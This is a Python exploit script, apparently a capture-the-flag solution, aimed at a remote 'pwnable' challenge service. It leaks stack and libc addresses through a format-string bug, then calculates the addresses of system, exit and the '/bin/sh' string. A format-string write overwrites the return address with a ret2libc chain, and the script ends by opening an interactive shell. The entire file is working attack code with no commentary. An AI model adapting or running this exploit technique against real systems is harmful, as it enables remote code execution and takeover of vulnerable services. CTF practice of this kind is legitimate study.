#!/usr/bin/env python
from sc_pwn import *

rhp     = ('pwnable.elliptic-shiho.xyz',20063)
#rhp     = ('192.168.75.129',8080)

offset_libc_main    = 0x00019970
offset_libc_exit    = 0x00032ec0
offset_libc_system  = 0x0003fcd0
offset_libc_str_sh  = 0x0015da84

#==========
def attack(nc):
    nc.sendln('0x%1$08x 0x%155$08x')
    nc.read_until('= ')

    addrs = nc.read_until('\n').split(' ')
    nc.read_all()
    addr_stack_ret = int(addrs[0],16) + 0x220
    addr_libc_main = int(addrs[1],16) - 0xf3
    
    addr_base_libc      = addr_libc_main - offset_libc_main
    addr_libc_system    = addr_base_libc + offset_libc_system
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_str_sh    = addr_base_libc + offset_libc_str_sh

    info('addr_stack_ret    = 0x%08x'%addr_stack_ret)
    info('addr_libc_system  = 0x%08x'%addr_libc_system)
    
    fsb = FSB(size=2)
    fsb.set_adrval(addr_stack_ret    , addr_libc_system)
    fsb.set_adrval(addr_stack_ret+0x4, addr_libc_exit)
    fsb.set_adrval(addr_stack_ret+0x8, addr_libc_str_sh)
    fsb.auto_write(index=7)
    nc.sendln(fsb.get())

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
